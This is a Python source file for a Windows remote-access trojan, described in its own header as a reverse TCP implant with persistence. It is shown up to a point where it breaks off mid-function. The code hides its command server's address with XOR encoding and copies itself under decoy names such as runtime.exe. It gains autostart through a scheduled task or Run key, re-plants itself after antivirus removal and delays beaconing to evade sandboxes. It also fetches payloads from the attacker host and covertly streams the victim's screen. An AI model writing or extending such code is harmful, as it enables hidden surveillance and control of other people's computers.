#!/usr/bin/env python3
"""
client.py - Reverse TCP implant with persistence (remote command execution only)
Configure LHOST / LPORT below.
"""

import socket
import subprocess
import os
import sys
import time
import random
import shutil
import threading

try:
    from _build_id import BUILD_ID
except Exception:
    BUILD_ID = "0"


def _x(h: str, key: int = 0x4D) -> str:
    """Decode a hex-XOR string (keeps tell-tale literals out of the binary)."""
    return bytes(int(h[i:i + 2], 16) ^ key for i in range(0, len(h), 2)).decode()


# ===== CONFIG =====
LHOST = _x("78637f7e7c637b7c637c7979")   # 5.231.61.144
LPORT = 4444             # Your listener port
RECONNECT_DELAY = 5      # Seconds before reconnect attempt
# (min, max) seconds to sleep before the first beacon (sandbox / static-
# behavior evasion). Set to (0, 0) to disable; RAT_FAST=1 bypasses it.
PRE_CONNECT_SLEEP = (30, 90)
# ==================

BUFFER = 4096
MARKER = _x("77770803097777").encode()   # ::END::

# ===== PERSISTENCE CONFIG (Windows) =====
INSTALL_DIR_NAME = _x("632e2c2e2528")   # .cache
# Candidate names, tried in order. First one that installs wins.
INSTALL_NAME_CANDIDATES = [
    _x("3f38233924202863283528"),   # runtime.exe
    _x("383d292c39283f63283528"),   # updater.exe
    _x("2528213d283f63283528"),   # helper.exe
]
REG_RUN_PATH = _x("1e222b393a2c3f281100242e3f223e222b39111a242329223a3e110e383f3f2823391b283f3e242223111f3823")
# "task" = scheduled task, on-logon trigger (lower behavioral weight
#           than a Run key); "run" = legacy HKCU Run key. Task mode
#           falls back to the Run key if the task cannot be registered.
PERSIST_MODE = _x("392c3e26")   # "task"
SCHTASK_NAME = _x("1f382339242028183d292c3928192c3e26")   # RuntimeUpdateTask
# =======================================


def _base_dir() -> str:
    """Base dir for install + runtime files: %USERPROFILE% root so the
    implant never writes to %TEMP% or %APPDATA% (both are heavily watched
    by AV/EDR). Falls back to %APPDATA% if USERPROFILE is unset."""
    return os.environ.get("USERPROFILE") or os.environ.get("APPDATA") or ""


def _module_exe_path() -> str:
    r"""Real on-disk path of the current process image (ctypes only).

    Nuitka onefile re-executes the same exe for the inner payload but
    fabricates sys.executable to a non-existent python.exe in the
    %TEMP%\onefile_* extraction dir. GetModuleFileNameW(NULL) returns
    the actual process image path, which always exists on disk.
    """
    try:
        import ctypes
        from ctypes import wintypes
        kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
        buf = ctypes.create_unicode_buffer(4096)
        n = kernel32.GetModuleFileNameW(None, buf, len(buf))
        if n:
            return buf.value
    except Exception:
        pass
    return ""


def get_self_path() -> str:
    r"""Path of the running executable (works frozen and as .py).

    Nuitka does NOT set sys.frozen; detect it via the __compiled__
    marker. In onefile mode use the process image path instead of the
    fabricated sys.executable so the file exists on disk.
    """
    if getattr(sys, "frozen", False) or "__compiled__" in globals():
        p = _module_exe_path()
        if p:
            return p
        return os.path.abspath(sys.executable)
    return os.path.abspath(__file__)


def hide_path(path: str) -> None:
    """Set the hidden+system attribute on a file or folder (Windows)."""
    if os.name != "nt":
        return
    try:
        subprocess.run(
            ["attrib", "+h", "+s", path],
            creationflags=subprocess.CREATE_NO_WINDOW,
            timeout=10,
        )
    except Exception:
        pass


def make_run_key_name(file_name: str) -> str:
    """Derive a Run key value name from the installed file name."""
    return os.path.splitext(file_name)[0].capitalize()


def try_install(install_dir: str, file_name: str, self_path: str):
    """
    Attempt to install under file_name. Returns full path on success,
    None if the name is taken by a locked file.
    """
    install_path = os.path.join(install_dir, file_name)

    # Already running from this exact path -> nothing to do
    if os.path.abspath(self_path).lower() == os.path.abspath(install_path).lower():
        return install_path

    # Delete any existing file at the target path first
    if os.path.exists(install_path):
        try:
            os.remove(install_path)   # replace stale/old copy
        except OSError:
            return None               # locked -> caller tries next name

    try:
        os.makedirs(install_dir, exist_ok=True)
        shutil.copy2(self_path, install_path)
    except Exception:
        return None

    return install_path


def _current_is_installed() -> bool:
    """True if we are already running from the hidden install dir."""
    root = _base_dir()
    if not root:
        return False
    self_path = os.path.abspath(get_self_path()).lower()
    return any(self_path == os.path.abspath(
        os.path.join(root, INSTALL_DIR_NAME, n)).lower()
        for n in INSTALL_NAME_CANDIDATES)


def _process_paths() -> set:
    """Full paths of all running processes, via ctypes only (no script
    engine -> no PowerShell/CIM telemetry in the guard loop)."""
    paths = set()
    try:
        import ctypes
        from ctypes import wintypes
        kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
        psapi = ctypes.WinDLL("psapi", use_last_error=True)

        enum = psapi.EnumProcesses
        PDWORD = ctypes.POINTER(wintypes.DWORD)
        enum.argtypes = (PDWORD, wintypes.DWORD, wintypes.LPDWORD)
        enum.restype = wintypes.BOOL
        query = kernel32.QueryFullProcessImageNameW
        query.argtypes = (wintypes.HANDLE, wintypes.DWORD,
                          wintypes.LPWSTR, wintypes.LPDWORD)
        query.restype = wintypes.BOOL
        openp = kernel32.OpenProcess
        openp.argtypes = (wintypes.DWORD, wintypes.BOOL, wintypes.DWORD)
        openp.restype = wintypes.HANDLE

        size = 8192
        while True:
            buf = (wintypes.DWORD * (size // 4))()
            needed = wintypes.DWORD()
            if not enum(ctypes.cast(buf, PDWORD), ctypes.sizeof(buf),
                        ctypes.byref(needed)):
                if ctypes.get_last_error() == 122 and size < (1 << 16):
                    size *= 2
                    continue
                return paths
            break
        count = needed.value // ctypes.sizeof(wintypes.DWORD)
        for pid in buf[:count]:
            if not pid:
                continue
            h = openp(0x1000, False, pid)   # PROCESS_QUERY_LIMITED_INFORMATION
            if not h:
                continue
            try:
                cap = wintypes.DWORD(4096)
                path = ctypes.create_unicode_buffer(4096)
                if query(h, 0, path, ctypes.byref(cap)):
                    paths.add(path.value.lower())
            finally:
                kernel32.CloseHandle(h)
    except Exception:
        pass
    return paths


def _installed_running() -> bool:
    """True if an installed candidate exe (EXACT path) is running.

    Exact-match only: in Nuitka onefile mode the inner payload re-executes
    from the extraction dir ({USERPROFILE}\\.cache\\rt\\...), so prefix-
    matching the install dir would make the very first run see itself as
    already installed and exit before installing. Only the original exe
    path (parent image) ever equals an installed candidate.
    """
    if os.name != "nt":
        return False
    root = _base_dir()
    if not root:
        return False
    try:
        running = _process_paths()
        return any(
            os.path.abspath(os.path.join(root, INSTALL_DIR_NAME, n)).lower()
            in running for n in INSTALL_NAME_CANDIDATES)
    except Exception:
        return False


def _parent_pid() -> int:
    """PID of the parent process (Toolhelp32 snapshot, ctypes only)."""
    try:
        import ctypes
        from ctypes import wintypes
        kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

        class PROCESSENTRY32W(ctypes.Structure):
            _fields_ = [
                ("dwSize", wintypes.DWORD),
                ("cntUsage", wintypes.DWORD),
                ("th32ProcessID", wintypes.DWORD),
                ("th32DefaultHeapID", ctypes.POINTER(wintypes.ULONG)),
                ("th32ModuleID", wintypes.DWORD),
                ("cntThreads", wintypes.DWORD),
                ("th32ParentProcessID", wintypes.DWORD),
                ("pcPriClassBase", ctypes.c_long),
                ("dwFlags", wintypes.DWORD),
                ("szExeFile", ctypes.c_wchar * 260),
            ]

        snap = kernel32.CreateToolhelp32Snapshot(0x2, 0)   # TH32CS_SNAPPROCESS
        if not snap or snap == -1:
            return 0
        try:
            pe = PROCESSENTRY32W()
            pe.dwSize = ctypes.sizeof(PROCESSENTRY32W)
            if not kernel32.Process32FirstW(snap, ctypes.byref(pe)):
                return 0
            my_pid = os.getpid()
            while True:
                if pe.th32ProcessID == my_pid:
                    return int(pe.th32ParentProcessID)
                if not kernel32.Process32NextW(snap, ctypes.byref(pe)):
                    return 0
        finally:
            kernel32.CloseHandle(snap)
    except Exception:
        return 0


def _pid_image_path(pid: int) -> str:
    """Full image path of a process by PID (ctypes only)."""
    try:
        import ctypes
        from ctypes import wintypes
        kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
        openp = kernel32.OpenProcess
        openp.argtypes = (wintypes.DWORD, wintypes.BOOL, wintypes.DWORD)
        openp.restype = wintypes.HANDLE
        query = kernel32.QueryFullProcessImageNameW
        query.argtypes = (wintypes.HANDLE, wintypes.DWORD,
                          wintypes.LPWSTR, wintypes.LPDWORD)
        query.restype = wintypes.BOOL

        h = openp(0x1000, False, pid)   # PROCESS_QUERY_LIMITED_INFORMATION
        if not h:
            return ""
        try:
            cap = wintypes.DWORD(4096)
            buf = ctypes.create_unicode_buffer(4096)
            if query(h, 0, buf, ctypes.byref(cap)):
                return buf.value
        finally:
            kernel32.CloseHandle(h)
    except Exception:
        pass
    return ""


def _parent_is_installed() -> bool:
    """True if our parent process image is an installed candidate.

    Nuitka onefile: the parent (bootstrapper) image is the original exe
    path, the child image is the extraction dir. So an installed copy
    launched at logon shows up as parent=~\\.cache\\helper.exe with the
    running payload as its child. If our parent is an installed candidate
    we ARE that payload and must connect, not exit.
    """
    if os.name != "nt":
        return False
    root = _base_dir()
    if not root:
        return False
    ppath = _pid_image_path(_parent_pid()).lower()
    if not ppath:
        return False
    return any(
        ppath == os.path.abspath(
            os.path.join(root, INSTALL_DIR_NAME, n)).lower()
        for n in INSTALL_NAME_CANDIDATES)


def _set_run_key(file_name: str, install_path: str) -> None:
    """(Re)create the HKCU Run entry for the installed copy."""
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_RUN_PATH, 0,
                             winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, make_run_key_name(file_name), 0,
                          winreg.REG_SZ, install_path)
        winreg.CloseKey(key)
    except Exception:
        pass


def _create_task(install_path: str) -> None:
    """Register a per-user 'on logon' scheduled task.

    schtasks /sc onlogon is denied for standard users; PowerShell
    Register-ScheduledTask (Task Scheduler COM) works without admin.
    """
    try:
        ps = (
            "$t = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME; "
            "$a = New-ScheduledTaskAction -Execute '%s'; "
            "$s = New-ScheduledTaskSettingsSet -ExecutionTimeLimit "
            "([TimeSpan]::Zero); "
            "Register-ScheduledTask -TaskName '%s' -Action $a -Trigger $t "
            "-Settings $s -Force | Out-Null"
        ) % (install_path.replace("'", "''"), SCHTASK_NAME)
        subprocess.run(
            ["powershell", "-NoProfile", "-WindowStyle", "Hidden",
             "-Command", ps],
            capture_output=True, timeout=30,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
    except Exception:
        pass


def _task_active() -> bool:
    """True if the scheduled task exists."""
    try:
        r = subprocess.run(
            ["schtasks", "/query", "/tn", SCHTASK_NAME],
            capture_output=True, timeout=15,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        return r.returncode == 0
    except Exception:
        return False


def _ensure_persistence(file_name: str, install_path: str) -> None:
    """(Re)create the autostart entry (task by default, Run key fallback)."""
    if PERSIST_MODE == _x("392c3e26"):   # "task"
        _create_task(install_path)
        if not _task_active():
            _set_run_key(file_name, install_path)   # fallback
    else:
        _set_run_key(file_name, install_path)


def install_persistence() -> None:
    """
    Install self under a hidden user-writable folder with a HKCU Run key.
    - Deletes any existing file at the target path first; falls back to
      the next candidate name if a file is locked.
    - Only exits (hand-off) AFTER the installed copy is confirmed alive.
      If AV kills the fresh copy within seconds, we keep running instead
      of dying into a dead file.
    User-level (mid-integrity) persistence - no admin required.
    """
    if os.name != "nt":
        return

    root = _base_dir()
    if not root:
        return
    install_dir = os.path.join(root, INSTALL_DIR_NAME)

    if _current_is_installed():
        return                      # already the installed copy
    if _installed_running():
        if _parent_is_installed():
            return                  # we are the installed copy's onefile payload
        sys.exit(0)                 # copy alive elsewhere; avoid double beacon

    install_path = None
    used_name = None
    for candidate in INSTALL_NAME_CANDIDATES:
        install_path = try_install(install_dir, candidate, get_self_path())
        if install_path:
            used_name = candidate
            break
    if not install_path:
        return                      # every candidate failed; bail quietly

    hide_path(install_dir)
    hide_path(install_path)
    _ensure_persistence(used_name, install_path)

    # Hand off ONLY after the copy is confirmed running
    try:
        p = subprocess.Popen(
            [install_path],
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
            close_fds=True,
        )
        time.sleep(3)
        if p.poll() is None:
            sys.exit(0)             # copy is alive -> safe to exit
        # copy died within 3s (quarantined?) -> keep running from here
    except Exception:
        pass


def _persistence_guard() -> None:
    """Background task: if the installed copy or autostart entry disappears
    (AV removal, manual deletion), re-plant it. Runs every 45 s."""
    if os.name != "nt":
        return
    root = _base_dir()
    if not root:
        return
    install_dir = os.path.join(root, INSTALL_DIR_NAME)
    while True:
        time.sleep(45)
        try:
            if _current_is_installed():
                continue            # we ARE the installed copy
            if _installed_running():
                # copy alive: make sure the autostart entry still points at it
                for candidate in INSTALL_NAME_CANDIDATES:
                    ip = os.path.join(install_dir, candidate)
                    if os.path.exists(ip):
                        _ensure_persistence(candidate, ip)
                        break
                continue
            # nothing running -> re-plant
            install_path = None
            used_name = None
            for candidate in INSTALL_NAME_CANDIDATES:
                install_path = try_install(install_dir, candidate, get_self_path())
                if install_path:
                    used_name = candidate
                    break
            if not install_path:
                continue
            hide_path(install_dir)
            hide_path(install_path)
            _ensure_persistence(used_name, install_path)
            subprocess.Popen(
                [install_path],
                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
                close_fds=True,
            )
        except Exception:
            continue


def _run_hidden(vnc_dir: str, bat_name: str, bat_url: str, arg: str):
    """Download a payload bat + the no-console launcher and run the bat with
    ZERO visible windows (GUI-subsystem run_hidden.exe -> cmd /d /s /c).
    Falls back to a wscript hidden-launch if the exe cannot be fetched.
    Returns an error string, or None on success."""
    import urllib.request
    os.makedirs(vnc_dir, exist_ok=True)
    dst = os.path.join(vnc_dir, bat_name)
    try:
        urllib.request.urlretrieve(bat_url, dst)
    except Exception as e:
        return f"download failed: {e}"

    launcher = os.path.join(vnc_dir, "run_hidden.exe")
    if not (os.path.isfile(launcher) and os.path.getsize(launcher) > 1000):
        try:
            urllib.request.urlretrieve(
                f"http://{LHOST}:8000/run_hidden.exe", launcher)
        except Exception:
            launcher = None
    if launcher and not (os.path.isfile(launcher) and os.path.getsize(launcher) > 1000):
        launcher = None

    flags = subprocess.CREATE_NO_WINDOW
    if hasattr(subprocess, "DETACHED_PROCESS"):
        flags |= subprocess.DETACHED_PROCESS
    try:
        if launcher:
            subprocess.Popen(
                [launcher, dst, arg],
                creationflags=flags,
                close_fds=True,
            )
        else:
            vbs = os.path.join(vnc_dir, "run_setup.vbs")
            with open(vbs, "w") as f:
                f.write(f'CreateObject("WScript.Shell").Run "cmd /c ""{dst}"" {arg}", 0, False\n')
            subprocess.Popen(
                ["wscript.exe", vbs],
                creationflags=flags,
                close_fds=True,
            )
    except Exception as e:
        return f"launch failed: {e}"
    return None


def deploy_vnc(cmd: str) -> bytes:
    """'stream [id]': download vnc_target_setup.bat + run_hidden.exe and run
    the bat with zero visible console. id N maps to VPS port 5900+N / web
    UI 6079+N."""
    parts = cmd.split()
    target_id = parts[1] if len(parts) > 1 else "1"
    if not target_id.isdigit():
        return f"[!] usage: stream [id] (got '{target_id}')\n".encode() + MARKER

    root = _base_dir()
    if not root:
        return b"[!] no USERPROFILE\n" + MARKER
    err = _run_hidden(
        os.path.join(root, "vnc"),
        "vnc_target_setup.bat",
        f"http://{LHOST}:8000/vnc_target_setup.bat",
        target_id,
    )
    if err:
        return f"[!] {err}\n".encode() + MARKER
    return (
        f"[+] VNC deployment started (target id {target_id}, "
        f"web UI port {6079 + int(target_id)})\n"
    ).encode() + MARKER


def stop_vnc(cmd: str) -> bytes:
    """'stop stream [id]': download vnc_target_stop.bat + run_hidden.exe and
    run the bat hidden to tear VNC down on the target (kills winvnc + tunnel
    loop, removes autostart). id defaults to 1."""
    parts = cmd.split()
    target_id = parts[-1] if parts[-1].isdigit() else "1"

    root = _base_dir()
    if not root:
        return b"[!] no USERPROFILE\n" + MARKER
    err = _run_hidden(
        os.path.join(root, "vnc"),
        "vnc_target_stop.bat",
        f"http://{LHOST}:8000/vnc_target_stop.bat",
        target_id,
    )
    if err:
        return f"[!] {err}\n".encode() + MARKER
    return f"[+] VNC teardown started (target id {target_id})\n".encode() + MARKER


def _vnc_procs() -> str:
    """Return tab-separated rows (pid, name, cmdline) for winvnc/ssh/plink."""
    ps = ("Get-CimInstance Win32_Process | Where-Object { $_.Name -match "
          "'winvnc|ssh|plink' } | ForEach-Object { \"{0}`t{1}`t{2}\" -f "
          "$_.ProcessId, $_.Name, $_.CommandLine }")
    try:
        r = subprocess.run(
            ["powershell", "-NoProfile", "-Command", ps],
            capture_output=True, timeout=15,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        return r.stdout.decode("utf-8", errors="replace")
    except Exception:
        return ""


def vnc_status() -> bytes:
    """'streams' / 'list streams': report this target's VNC stream state."""
    import re
    root = _base_dir()
    if not root:
        return b"[!] no USERPROFILE\n" + MARKER
    d = os.path.join(root, "vnc")
    if not os.path.isdir(d):
        return b"[*] VNC not deployed on this target\n" + MARKER

    stream_id = None
    try:
        with open(os.path.join(d, "stream.id")) as f:
            stream_id = f.read().strip() or None
    except Exception:
        pass

    winvnc_pid = None
    tunnel_pid = None
    tunnel_port = None
    for line in _vnc_procs().splitlines():
        parts = line.split("\t")
        if len(parts) < 3:
            continue
        pid, name, cl = parts[0], parts[1].lower(), parts[2]
        if name == "winvnc.exe":
            winvnc_pid = pid
        elif name in ("ssh.exe", "plink.exe") and cl and "-R" in cl and "127.0.0.1:5900" in cl:
            tunnel_pid = pid
            m = re.search(r"-R\s+(\d+):127\.0\.0\.1:5900", cl)
            if m:
                tunnel_port = int(m.group(1))

    if stream_id is None and tunnel_port:
        stream_id = str(tunnel_port - 5900)
    if stream_id is None and winvnc_pid:
        stream_id = "?"

    autostart = False
    if os.name == "nt":
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_RUN_PATH)
            autostart = winreg.QueryValueEx(key, "VncHidden")[0] != ""
            winreg.CloseKey(key)
        except Exception:
            autostart = False

    web = f"http://{LHOST}:{6079 + int(stream_id)}/vnc.html" if stream_id and stream_id.isdigit() else "?"
    lines = [f"[*] target stream: id={stream_id or 'none'}"]
    lines.append(f"    winvnc:    {'RUNNING pid ' + winvnc_pid if winvnc_pid else 'not running'}")
    if tunnel_pid:
        lines.append(f"    tunnel:    RUNNING pid {tunnel_pid} -> VPS 127.0.0.1:{tunnel_port}")
    else:
        lines.append("    tunnel:    not running")
    lines.append(f"    autostart: {'enabled (HKCU VncHidden)' if autostart else 'disabled'}")
    lines.append(f"    web UI:    {web}   (password: {_x('092c2024212c3f28')})")
    if winvnc_pid and tunnel_pid:
        lines.append("    status:    ACTIVE - open the web UI URL above")
    else:
        lines.append(f"    status:    PARTIAL/STOPPED - deploy with: stream {stream_id or '1'}")
    try:
        with _S2["lock"]:
            s2th, s2i = _S2["th"], dict(_S2["info"])
        if s2th and s2th.is_alive():
            lines.append("    stream2:  id=%s state=%s %sx%s@%s (%s)" % (
                s2i.get("id"), s2i.get("state"), s2i.get("w"), s2i.get("h"),
                s2i.get("fps"), s2i.get("encoder")))
    except Exception:
        pass
    return ("\n".join(lines) + "\n").encode() + MARKER


# ==================== STREAM2: python-native H.264 streaming ====================
# UltraVNC-free streaming: DXGI Desktop Duplication capture (dxcam) on Win8+,
# GDI (ctypes) fallback on Win7/CPU-only; H.264 encode via PyAV with a tiered
# pick (h264_mf / Media-Foundation HW accel > libx264 universal software >
# mpeg4); MPEG-TS over TCP 127.0.0.1:25900+id, reverse-tunnelled to the VPS
# exactly like the VNC stream (see vnc_target_setup.bat). The python-embed
# runtime has no site-packages, so on first use the wheel bundle is lazily
# pulled from http://LHOST:8000/stream_bundle_cp<vmaj><vmin>_<arch>.zip into
# %USERPROFILE%\.cache\stream and imported from there. On dev boxes the
# site-packages versions are used as-is (no download).

STREAM2_PORT_BASE = 25900      # local TS listener + VPS tunnel port: 25900 + id
STREAM2_DIR_NAME = "stream"    # under %USERPROFILE%\.cache
STREAM2_DEF_W, STREAM2_DEF_H, STREAM2_DEF_FPS = 1280, 720, 30
STREAM2_BR_1080P = 4_000_000   # anchor bitrate, scaled by pixel count
STREAM2_HTTP_PORT = 8000       # bundle server (same port as the VNC files)

_S2 = {"th": None, "stop": threading.Event(), "id": None,
       "info": {}, "lock": threading.Lock()}


class _S2SockWriter:
    """Socket adapter so PyAV can mux MPEG-TS straight to the viewer."""
    __slots__ = ("sock",)

    def __init__(self, sock):
        self.sock = sock

    def write(self, b):
        self.sock.sendall(b)


def _s2_dir() -> str:
    return os.path.join(_base_dir(), INSTALL_DIR_NAME, STREAM2_DIR_NAME)


def _s2_bundle_name() -> str:
    try:
        import platform
        arch = {"amd64": "amd64", "x86": "win32", "arm64": "arm64"}.get(
            platform.machine().lower())
        if arch:
            return "stream_bundle_cp%d%d_%s.zip" % (
                sys.version_info[0], sys.version_info[1], arch)
    except Exception:
        pass
    return "stream_bundle.zip"


def _s2_load_runtime() -> None:
    """Import av/dxcam/numpy - bundle on embed runtimes, site-packages on dev."""
    for attempt in (0, 1):
        try:
            import av, dxcam, numpy  # noqa: F401
            return
        except Exception:
            if attempt == 1:
                raise RuntimeError("stream2 deps unavailable (av/dxcam/numpy)")
        d = _s2_dir()
        os.makedirs(d, exist_ok=True)
        hide_path(d)
        z = os.path.join(d, _s2_bundle_name())
        if not os.path.isfile(z):
            url = "http://%s:%d/%s" % (LHOST, STREAM2_HTTP_PORT,
                                        _s2_bundle_name())
            try:
                import urllib.request
                with urllib.request.urlopen(url, timeout=90) as r, open(z, "wb") as f:
                    shutil.copyfileobj(r, f)
            except Exception as e:
                raise RuntimeError("bundle download failed (%s)" % e)
        try:
            import zipfile
            with zipfile.ZipFile(z) as zf:
                zf.extractall(d)
        except Exception as e:
            raise RuntimeError("bundle extract failed (%s)" % e)
        for sub in (d, os.path.join(d, "av.libs"),
                    os.path.join(d, "numpy.libs")):
            if os.path.isdir(sub):
                os.add_dll_directory(sub)
        sys.path.insert(0, d)


def _s2_gdi_grab():
    """Win7/GDI fallback screen capture -> BGR ndarray (ctypes only)."""
    import ctypes
    from ctypes import wintypes
    gdi32 = ctypes.WinDLL("gdi32", use_last_error=True)
    user32 = ctypes.WinDLL("user32", use_last_error=True)
    w, h = user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)
    if w <= 0 or h <= 0:
        return None
    hdc = user32.GetDC(None)
    mem = gdi32.CreateCompatibleDC(hdc)

    class BITMAPINFOHEADER(ctypes.Structure):
        _fields_ = [
            ("biSize", wintypes.DWORD), ("biWidth", wintypes.LONG),
            ("biHeight", wintypes.LONG), ("biPlanes", wintypes.WORD),
            ("biBitCount", wintypes.WORD), ("biCompression", wintypes.DWORD),
            ("biSizeImage", wintypes.DWORD), ("biXPelsPerMeter", wintypes.LONG),
            ("biYPelsPerMeter", wintypes.LONG), ("biClrUsed", wintypes.DWORD),
            ("biClrImportant", wintypes.DWORD),
        ]

    bmi = BITMAPINFOHEADER()
    bmi.biSize = ctypes.sizeof(BITMAPINFOHEADER)
    bmi.biWidth, bmi.biHeight = w, -h   # negative height = top-down rows
    bmi.biPlanes, bmi.biBitCount = 1, 32
    bits = ctypes.c_void_p()
    dib = gdi32.CreateDIBSection(mem, ctypes.byref(bmi), 0,
                                 ctypes.byref(bits), None, 0)
    if not dib:
        gdi32.DeleteDC(mem)
        user32.ReleaseDC(None, hdc)
        return None
    gdi32.SelectObject(mem, dib)
    if not gdi32.BitBlt(mem, 0, 0, w, h, hdc, 0, 0, 0x00CC0020):  # SRCCOPY
        gdi32.DeleteObject(dib)
        gdi32.DeleteDC(mem)
        user32.ReleaseDC(None, hdc)
        return None
    import numpy as np
    arr = np.frombuffer(ctypes.string_at(bits, w * h * 4), dtype=np.uint8
                        ).reshape(h, w, 4)[:, :, :3].copy()  # BGRA -> BGR
    gdi32.DeleteObject(dib)
    gdi32.DeleteDC(mem)
    user32.ReleaseDC(None, hdc)
    return arr


def _s2_capture():
    """Start the best capture backend -> (grab, stop). Raises on total failure."""
    import dxcam
    cam = None
    try:
        # numpy backend avoids the cv2 dependency (bundle ships the compiled
        # _numpy_kernels .pyd; cv2 is not included in the wheel bundle).
        cam = dxcam.create(output_idx=0, output_color="BGR",
                           processor_backend="numpy")
    except TypeError:
        # older dxcam without processor_backend kwarg
        cam = dxcam.create(output_idx=0, output_color="BGR")
    except Exception:
        cam = None
    if cam is not None:
        cam.start(target_fps=STREAM2_DEF_FPS, video_mode=True)
        return cam.get_latest_frame, cam.stop
    grab = _s2_gdi_grab
    if grab() is None:
        raise RuntimeError("no capture backend (DXGI failed, GDI failed)")
    return grab, (lambda: None)


def _s2_bitrate(w, h) -> int:
    return max(250_000, min(8_000_000,
                            int(STREAM2_BR_1080P * w * h / (1920 * 1080))))


def _s2_make_encoder(name, w, h, fps, br):
    """Create + open an encoder context by name (with MF-open retry)."""
    import av
    from fractions import Fraction
    c = av.CodecContext.create(name, "w")
    c.width, c.height = w, h
    c.time_base = Fraction(1, fps)
    c.framerate = fps
    c.pix_fmt = "yuv420p"
    c.bit_rate = br
    if name == "libx264":
        c.options = {"preset": "veryfast", "tune": "zerolatency"}
    elif name == "h264_mf":
        c.options = {"usage": "1"}
    last = None
    for _ in range(3):
        try:
            c.open()
            return c
        except Exception as e:
            last = e
    raise RuntimeError("encoder open failed: %s" % last)


def _s2_pick_encoder(w, h, fps):
    """Tiered encoder pick: h264_mf (HW) > libx264 (universal) > mpeg4."""
    import av
    for name in ("h264_mf", "libx264", "mpeg4"):
        if name not in av.codec.codecs_available:
            continue
        try:
            _s2_make_encoder(name, w, h, fps, _s2_bitrate(w, h))
            return name
        except Exception:
            continue
    return None


def _s2_run(target_id: str) -> None:
    """Stream thread: capture -> tiered H.264 -> MPEG-TS on 127.0.0.1:25900+id.
    Encodes only while a viewer is connected; auto-degrades resolution once if
    the encoder cannot keep up with the target frame rate."""
    from fractions import Fraction
    stop = _S2["stop"]
    info = _S2["info"]
    port = STREAM2_PORT_BASE + int(target_id)
    info.update(id=target_id, port=port, started=time.time(), encoder="?",
                state="starting", w=STREAM2_DEF_W, h=STREAM2_DEF_H,
                fps=STREAM2_DEF_FPS, viewers=0, bytes=0, frames=0,
                degraded=False)

    try:
        _s2_load_runtime()   # bundle on embed runtimes, site-packages on dev
        import av            # AFTER load_runtime: may come from the bundle
        grab, stop_cam = _s2_capture()
    except Exception as e:
        info.update(state="failed: %s" % e)
        print("stream2: %s" % e, file=sys.stderr)
        return

    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("127.0.0.1", port))
        srv.listen(1)
        srv.settimeout(0.5)
    except Exception as e:
        stop_cam()
        info.update(state="failed: bind %s" % e)
        return

    enc_name = _s2_pick_encoder(STREAM2_DEF_W, STREAM2_DEF_H,
                                STREAM2_DEF_FPS)
    if not enc_name:
        stop_cam()
        srv.close()
        info.update(state="failed: no usable video encoder in PyAV")
        return
    info["encoder"] = enc_name
    print("stream2: encoder=%s from %s" % (enc_name, av.__file__), file=sys.stderr)
    info.update(state="ready - waiting for viewer")

    while not stop.is_set():
        try:
            conn, _ = srv.accept()
        except socket.timeout:
            continue
        except OSError:
            break
        if conn is None:
            continue
        conn.settimeout(2.0)
        writer = _S2SockWriter(conn)
        w, h, fps = STREAM2_DEF_W, STREAM2_DEF_H, STREAM2_DEF_FPS
        info.update(state="streaming", viewers=1)
        viewer_dead = False
        while not stop.is_set() and not viewer_dead:
            # (re)build the encoder + TS mux for the current resolution
            try:
                enc = _s2_make_encoder(enc_name, w, h, fps, _s2_bitrate(w, h))
                mux = av.open(writer, "w", format="mpegts")
                st = mux.add_stream("h264", rate=fps)
                st.codec_context.extradata = enc.extradata or b""
            except Exception as e:
                info.update(state="failed: %s" % e)
                viewer_dead = True
                break
            n_frames = 0
            n_bytes = 0
            t0 = time.time()
            degrade = False
            try:
                while not stop.is_set() and not degrade:
                    frame = grab()
                    if frame is None:
                        time.sleep(0.01)
                        continue
                    src = av.VideoFrame.from_ndarray(frame, format="bgr24")
                    scaled = src.reformat(width=w, height=h,
                                          format="yuv420p",
                                          interpolation="BICUBIC")
                    scaled.pts = n_frames * 1_000_000 // fps
                    scaled.time_base = Fraction(1, 1_000_000)
                    for pkt in enc.encode(scaled):
                        pkt.stream = st
                        mux.mux(pkt)
                        n_bytes += pkt.size
                    n_frames += 1
                    now = time.time()
                    if now - t0 >= 5.0:
                        real = n_frames / max(now - t0, 0.001)
                        info.update(bytes=info.get("bytes", 0) + n_bytes,
                                    frames=info.get("frames", 0) + n_frames)
                        if real < fps * 0.6 and not info.get("degraded")\
                                and w > 640:
                            w, h, fps = w // 2, h // 2, max(10, fps // 2)
                            info.update(w=w, h=h, fps=fps, degraded=True)
                            degrade = True
                        else:
                            n_frames, n_bytes, t0 = 0, 0, now
            except OSError:
                pass    # viewer disconnected
            except Exception as e:
                info.update(state="stream error: %s" % e)
            try:
                mux.close()
            except Exception:
                pass
            if not degrade:
                viewer_dead = True
        try:
            conn.close()
        except OSError:
            pass
        info.update(viewers=0, state="ready - waiting for viewer")
    try:
        srv.close()
    except OSError:
        pass
    stop_cam()
    info.update(state="stopped")


def deploy_stream2(cmd: str) -> bytes:
    """'stream2 [id]': start the python-native H.264 stream. id N maps to
    VPS port 25900+N (reverse tunnel) and local 127.0.0.1:25900+N."""
    parts = cmd.split()
    target_id = parts[1] if len(parts) > 1 and parts[1].isdigit() else "1"
    if not target_id.isdigit():
        return b"[!] usage: stream2 [id]\n" + MARKER
    with _S2["lock"]:
        th = _S2["th"]
        if th and th.is_alive():
            return (b"[!] stream2 already running (id " +
                    str(_S2["info"].get("id", "?")).encode() +
                    b") - use 'stop stream2' first\n" + MARKER)
        _S2["stop"].clear()
        _S2["th"] = threading.Thread(target=_s2_run, args=(target_id,),
